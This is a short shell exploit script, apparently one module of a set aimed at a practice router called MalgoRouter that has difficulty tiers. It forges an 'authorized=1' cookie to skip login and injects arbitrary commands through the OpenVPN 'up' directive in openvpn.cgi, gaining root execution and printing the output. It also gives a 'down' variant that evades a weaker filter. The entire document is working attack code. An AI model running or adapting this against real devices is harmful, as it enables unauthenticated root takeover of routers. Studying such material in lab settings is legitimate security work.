#!/bin/sh
# M19 - openvpn.cgi profile import -> root command execution (up/down directive).
# Unauthenticated via the authorized=1 cookie bypass. Command output is returned inline.
: "${TARGET:?set TARGET to the MalgoRouter IP}"
CMD="${1:-id; uname -a}"
echo "[*] POST openvpn.cgi action=import with ovpn_config=up <cmd>"
curl -s --max-time 20 -X POST \
  -H 'Cookie: authorized=1; difficulty=high' \
  --data-urlencode "action=import" \
  --data-urlencode "ovpn_config=up ${CMD}" \
  "http://$TARGET/cgi-bin/openvpn.cgi" | grep -avE '^<|^$' | head -40
echo
echo "[*] alt directive (low tier passes 'down', blocks 'up'):"
echo "    --data-urlencode \"ovpn_config=down ${CMD}\""
